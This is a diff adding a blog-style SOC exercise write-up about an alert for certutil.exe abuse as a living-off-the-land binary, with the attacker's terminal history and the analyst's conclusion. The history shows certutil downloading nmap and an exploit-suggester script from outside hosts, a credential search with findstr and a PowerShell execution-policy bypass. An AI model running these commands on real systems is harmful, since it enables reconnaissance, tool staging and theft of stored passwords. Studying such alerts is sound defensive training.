@@ -1,0 +1,61 @@
+# Summary
+
+In this alert we investigate a suspicious usage of a Windows binary called **certutil.exe**. The main focus of this exercise was to learn about LolBins (Living-off-the-land binaries).
+
+> A Living-off-the-land binaries is any binary supplied by the operating system that is normally used for legitimate purposes but can also be abused by malicious actors. Several default system binaries have unexpected side effects, which may allow attackers to hide their activities post-exploitation.
+
+# Alert 
+
+```
+EventID : 113
+Event Time : Mar, 01, 2022, 11:06 AM
+Rule : SOC163 - Suspicious Certutil.exe Usage
+Level : Security Analyst
+Hostname : EricProd
+IP Address : 172.16.17.22
+Related Binary : certutil.exe
+Binary Path : C:/Windows/System32/certutil.exe
+Command Line : certutil.exe -urlcache -split -f https://nmap.org/dist/nmap-7.92-win32.zip nmap.zip
+Alert Trigger Reason : -f parameter with certutil.exe
+EDR Action : Allowed
+```
+
+# Detection
+
+We can look at the terminal history of the host EricProd which caused the alarm. to be created in “Endpoint Security”.  As you can see in the table below “nmap” and the “windows-exploit-suggester”  were downloaded.
+
+| EVENT      | COMMAND LINE                                                                                                                                             |
+| ---------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| 01.03.2021 | `whoami`                                                                                                                                                 |
+| 01.03.2021 | `net user`                                                                                                                                               |
+| 01.03.2021 | `net user`                                                                                                                                               |
+| 01.03.2021 | `ipconfig`                                                                                                                                               |
+| 01.03.2021 | `ipconfig /all`                                                                                                                                          |
+| 01.03.2021 | `net Localgroup`                                                                                                                                         |
+| 01.03.2021 | `net start`                                                                                                                                              |
+| 01.03.2021 | `netstat`                                                                                                                                                |
+| 01.03.2021 | `tasklist`                                                                                                                                               |
+| 01.03.2021 | `systeminfo`                                                                                                                                             |
+| 01.03.2021 | `certutil.exe -urlcache -split -f https://nmap.org/dist/nmap-7.92-setup.exe nmap.zip`                                                                    |
+| 01.03.2021 | `certutil.exe -urlcache -split -f https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py check.py` |
+| 01.03.2021 | `nmap -sV 192.168.0.0/24 -p 80`                                                                                                                          |
+| 01.03.2021 | `python3 check.py`                                                                                                                                       |
+| 01.03.2021 | `arp -a`                                                                                                                                                 |
+| 01.03.2021 | `findstr /si pass *.txt \| *.xml \| *.ini`                                                                                                               |
+| 01.03.2021 | `C:/powershell.exe -nop -exec bypass`                                                                                                                    |
+
+# Analysis
+
+By searching was certutil does we discovered that it is considered a legal binary offered by Windows OS. The user run certutil to download a version of nmap and later on he started performing a scan of the internal network. The scan was performed on the subnet: 192.168.0.0/24 looking at services running specifically on port 80. 
+
+```
+$ certutil.exe -urlcache -split -f https://nmap.org/dist/nmap-7.92-setup.exe nmap.zip
+
+$ nmap -sV 192.168.0.0/24 -p 80
+```
+# Conclusion
+
+The alert was a true positive. The purpose of suspicious activities performed with legal binaries for this incident was to download the tool called nmap. No malware was detected on the machine so we can assume it has been the user of the system who run the terminal commands.
+
+
+[Heartstone back home](https://matteogreek.github.io/)
